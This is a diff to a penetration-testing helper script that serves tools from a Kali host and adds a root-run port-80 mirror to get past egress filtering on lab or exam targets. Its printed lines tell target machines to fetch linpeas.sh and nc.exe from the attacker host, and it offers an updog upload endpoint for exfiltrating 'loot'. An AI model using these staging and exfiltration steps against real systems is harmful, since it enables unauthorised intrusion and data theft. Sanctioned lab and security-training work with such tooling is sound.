@@ -27,6 +27,36 @@ echo "[*] Serving $(pwd) on 0.0.0.0:$PORT  (Kali IP: $KALI)"
 echo "    Linux:    wget http://$KALI:$PORT/linux/linpeas.sh -O /tmp/lp.sh"
 echo "    Windows:  certutil -urlcache -f http://$KALI:$PORT/windows/nc.exe nc.exe"
 
+# --- also stage a download-only mirror on port 80 ---------------------------
+# Many lab/exam targets egress-filter high ports but allow outbound 80. This
+# background python http.server mirrors the same dir on :80 so a wget to 80
+# just works. Binding 80 needs root; if that's unavailable or 80 is busy we
+# warn and carry on with the primary server only. Set STAGE80=0 to skip.
+STAGE80="${STAGE80:-1}"
+MIRROR_PID=""
+cleanup() { [ -n "$MIRROR_PID" ] && kill "$MIRROR_PID" 2>/dev/null; }
+trap cleanup EXIT INT TERM
+
+if [ "$STAGE80" = "1" ] && [ "$PORT" != "80" ]; then
+  if ss -tlnH 'sport = :80' 2>/dev/null | grep -q .; then
+    echo "[!] port 80 already in use - skipping the :80 mirror"
+  # Cache the sudo credential in the foreground first (prompts once if needed)
+  # so the backgrounded server doesn't stall on SIGTTIN waiting for a password.
+  elif ! sudo -v 2>/dev/null; then
+    echo "[!] no sudo for :80 - primary server only (run 'sudo -v' then re-launch, or use the primary port)"
+  else
+    sudo python3 -m http.server 80 --bind 0.0.0.0 --directory "$(pwd)" >/dev/null 2>&1 &
+    MIRROR_PID=$!
+    sleep 0.3
+    if kill -0 "$MIRROR_PID" 2>/dev/null; then
+      echo "    [:80 mirror] wget http://$KALI/linux/linpeas.sh -O /tmp/lp.sh   (download-only)"
+    else
+      MIRROR_PID=""
+      echo "[!] could not bind :80 - primary server only"
+    fi
+  fi
+fi
+
 if command -v updog >/dev/null; then
   echo "    (updog: browser upload at http://$KALI:$PORT/upload - exfil loot back; uploads land in $(pwd))"
   $SUDO "$(command -v updog)" -d . -p "$PORT"
